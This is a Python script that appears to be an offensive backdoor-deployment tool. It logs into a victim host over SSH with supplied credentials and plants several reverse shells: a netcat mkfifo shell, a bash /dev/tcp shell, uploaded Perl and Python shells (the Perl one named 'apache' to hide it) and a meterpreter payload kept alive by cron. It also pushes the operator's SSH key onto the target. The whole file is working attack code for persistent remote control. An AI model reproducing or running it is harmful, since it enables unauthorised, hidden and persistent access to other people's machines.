from paramiko import SSHClient
from scp import SCPClient
import paramiko
import os
import socket
import subprocess

# TODO: Add option to specify (and pick a default) a more secret location to copy over files instead of the home directory
# TODO: Clean up backdoors into folders (metasploit, python, netcat, etc) - Netcat doesn't have any files, and the perl and python ones should be completely in a folder
# TODO: perl and python both will not work unless given an account with root. We could give the user an option of whether the account has root.
# TODO: Give netcat root

# Updated netcat, given root (nohup doesn't work ;(

def scpFiles(filename, recur=True):#call this with a filename and false if it is a single file
    ssh.exec_command("rm " + filename)
    scp.put(filename, recursive=recur)

def netcatBackdoor():
    raw_input("Please enter the following command: nc -v -n -l -p 53920")
    print("Initializing backdoor...")
    ssh.exec_command("echo " + pword + " | sudo -S rm /tmp/f;")
    ssh.exec_command("echo " + pword + " | sudo -S nohup mkfifo /tmp/f;")
    ssh.exec_command("echo " + pword + " | sudo -S nohup cat /tmp/f|/bin/sh -i 2>&1 | sudo nohup nc " + newIP + " 53920 > /tmp/f")
    print("Netcat backdoor on port 53920 attempted.")

def bashBackdoor():
    raw_input("Please enter the following command: nc -v -n -l -p 53923")
    print("Initializing backdoor...")
    ssh.exec_command("echo " +  pword + " | sudo -S nohup bash -i >& /dev/tcp/10.1.0.1/53923 0>&1")
    print("Bash Backdoor on port 53923 attempted. You may need to input the password, which is " + pword)

def perlBackdoor():
    toW = 'perl/prsA.pl'
    stringToAdd = ""
    fileToWrite = open(toW, 'w')

    with open ("perl/prs1", "r") as myfile:
        data=myfile.read()
    data = data[:-1]#remove the last new line character.
    stringToAdd+=data + newIP

    with open ("perl/prs2", "r") as myfile:
        data=myfile.read()
    stringToAdd+=data
    fileToWrite.write(stringToAdd)
    fileToWrite.close()

    raw_input("Enter the following command: nc -v -n -l -p 53921. Press enter")
    scpFiles('perl/prsA.pl', False)
    print("Moving the backdoor script.")
    ssh.exec_command("echo " + pword + " | sudo -S nohup perl prsA.pl")
    print("Perl backdoor on port 53921 attempted. It's gonna name itself apache so hopefully the target won't see what's going on. If you stop the listener, the backdoor will stop.")

def pythBackdoor():
    toW = 'pythScript/pythBackdoor.py'
    stringToAdd = ""
    fileToWrite = open(toW, 'w')

    with open ("pythScript/pythPart1", "r") as myfile:
        data=myfile.read()
    data = data[:-1]#remove the last new line character.
    stringToAdd+=data + newIP
    
    with open ("pythScript/pythPart2", "r") as myfile:
        data=myfile.read()
    stringToAdd+=data
    fileToWrite.write(stringToAdd)
    fileToWrite.close()
    raw_input("Enter the following command: nc -v -n -l -p 53922. Press enter")
    ssh.exec_command('rm pythBackdoor.py')
    scpFiles('pythScript/pythBackdoor.py', False)
    print("Moving the backdoor script.")
    ssh.exec_command("echo " +  pword + " | sudo -S nohup python pythBackdoor.py")
    print("Python backdoor on 53922 attempted.")

def metasploitBackdoor():
     cron = (raw_input("  + Press y to start backdoor as a cronjob (recommended): ") == 'y')
     #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
     os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f elf X -o initd" % localIP)
     scpFiles('initd', False)
     print("Backdoor sript moved")
     ssh.exec_command("chmod +x initd")
     if cron:
         ssh.exec_command("crontab -l > mycron")
         ssh.exec_command("echo \"* * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
     print("Backdoor attempted on port 4444. Backdoor will attempt to reconnect every second, and will stop attempting once connection is made. To access, open msfconsole and run:")
     print("use multi/handler\n \
     > set PAYLOAD linux/x86/meterpreter/reverse_tcp\n \
     > set LHOST %s\n \
     > exploit", newIP)
     raw_input("Press any key to launch exploit once msfconsole is listening...")
     ssh.exec_command("watch -n1 nohup ./initd > /dev/null &")
     
proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
localIP = proc.stdout.read()
localIP = localIP[:-1]
newIP = ""#newIP is the variable holding the ip if you want to use it.
if(raw_input("Press y to continue with localhost ip " + localIP + ": ") == 'y'):
    newIP = localIP
else:
    newIP = raw_input("Please input the ip you want to use: ")
    print("Your IP is now: " + newIP)
hostname = raw_input('Hostname: ') #victim host
port = 22; #change this if the port is different, almost never necessary
uname = raw_input('Username: ') #username for the box to be attacked
pword = raw_input('Password: ') #password for the box to be attacked
if (raw_input("Press y to copy private key over to target: ") == 'y'):
    os.system("sshpass -p %s ssh-copy-id %s@%s" % (pword, uname, hostname))
print("Opening SSH connection to target...")
ssh = SSHClient()#use ssh.exec_command("") to perform an action.
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname, username=uname, password=pword)
scp = SCPClient(ssh.get_transport())#don't call this, but use the above function instead.

if(raw_input('Press y to start a netcat backdoor: ') == 'y'):#this may be better done a switch statement so you can specify which one to do instead of having to say no to all the others
	netcatBackdoor()
if(raw_input('Press y to start a perl backdoor: ') == 'y'):
	perlBackdoor()
if(raw_input('Press y to start a python backdoor: ') == 'y'):
    pythBackdoor()
if(raw_input('Press y to start a bash backdoor: ') == 'y'):
    bashBackdoor()
if(raw_input('Press y to start a metasploit backdoor: ') == 'y'):
    metasploitBackdoor()
raw_input('Press any key to close the program.')
scp.close()



